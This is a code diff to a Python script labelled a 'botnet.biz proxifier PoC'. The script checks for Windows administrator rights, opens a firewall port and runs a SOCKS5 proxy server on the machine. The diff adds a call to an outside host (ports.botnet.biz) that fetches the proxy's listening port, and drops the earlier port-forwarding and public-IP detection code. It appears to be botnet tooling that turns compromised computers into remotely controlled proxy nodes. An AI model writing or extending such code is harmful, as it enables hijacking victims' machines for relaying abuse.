@@ -1,4 +1,5 @@
-import ctypes, sys
+import ctypes
+import sys
 import subprocess
 import socket
 import _thread
@@ -6,12 +7,12 @@ import time
 import logging
 import select
 import struct
+import urllib.request
 from IPy import IP
 from socketserver import ThreadingMixIn, TCPServer, StreamRequestHandler
 
-#botnet.biz proxifier PoC
-#@author Tomáš Keske
-#@since 16.12.2018
+__author__ = "Tomas Keske <admin@botnet.biz>"
+__website__ = "https://github.com/tkeske/"
 
 logging.basicConfig(level=logging.DEBUG)
 SOCKS_VERSION = 5
@@ -133,61 +134,6 @@ class SocksProxy(StreamRequestHandler):
                 if client.send(data) <= 0:
                     break
 
-class PortForward():
-
-    def __init__(self):
-        self = self
-
-    def main(self, setup, error):
-        # open file for error messages
-        sys.stderr = open(error, 'a')
-        # read settings for port forwarding
-
-        for settings in self.parse(setup):
-            _thread.start_new_thread(self.server, settings)
-        # wait for <ctrl-c>
-
-        while True:
-           time.sleep(60)
-
-    def parse(self, setup):
-        settings = list()
-        a = open(setup, "r")
-        for line in a:
-
-            print("setup")
-            # skip comment line
-            if line.startswith('#'):
-                continue
-
-            parts = line.split()
-            settings.append((int(parts[0]), parts[1], int(parts[2])))
-        return settings
-
-    def server(self, *settings):
-        try:
-            dock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            dock_socket.bind(('', settings[0]))
-            dock_socket.listen(5)
-            while True:
-                client_socket = dock_socket.accept()[0]
-                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                server_socket.connect((settings[1], settings[2]))
-                _thread.start_new_thread(self.forward, (client_socket, server_socket))
-                _thread.start_new_thread(self.forward, (server_socket, client_socket))
-        finally:
-            _thread.start_new_thread(self.server, settings)
-
-    def forward(self, source, destination):
-        string = ' '
-        while string:
-            string = source.recv(1024)
-            if string:
-                destination.sendall(string)
-            else:
-                source.shutdown(socket.SHUT_RD)
-                destination.shutdown(socket.SHUT_WR)
-
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -200,42 +146,24 @@ def openFirewallPort():
               stdout=sys.stdout)
         p.communicate()
 
-def getIp():
+def getPort():
+    port = urllib.request.urlopen("http://ports.botnet.biz").read()
+    port = int(port)
 
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        sockName = s.getsockname()[0]
-        s.close()
-        return sockName
-
-
-def isIpPublic(ip):
-        ip = IP(ip)
-        return ip.iptype()
+    return port
 
 if is_admin():
 
-        #determine if host has public ip or not
-        ip = getIp()
-        ipFlag = isIpPublic(ip)
+        #get port from database
+        port = getPort()
 
-        print(ipFlag)
+        #add firewall exception
+        openFirewallPort()
 
-        if ipFlag == "PUBLIC":
-
-            #add firewall exception
-           openFirewallPort()
-
-            #run the socks5 server
-           if __name__ == '__main__':
-                    with ThreadingTCPServer((ip, 6699), SocksProxy) as server:
-                            server.serve_forever()
-
-        if ipFlag == "PRIVATE":
-
-           if __name__ == '__main__':
-                pf = PortForward()
-                pf.main('port-forward.config', 'error.log')
+        #run the socks5 server
+        if __name__ == '__main__':
+                with ThreadingTCPServer(("127.0.0.1", port), SocksProxy) as server:
+                        server.serve_forever()
 
 
 else:
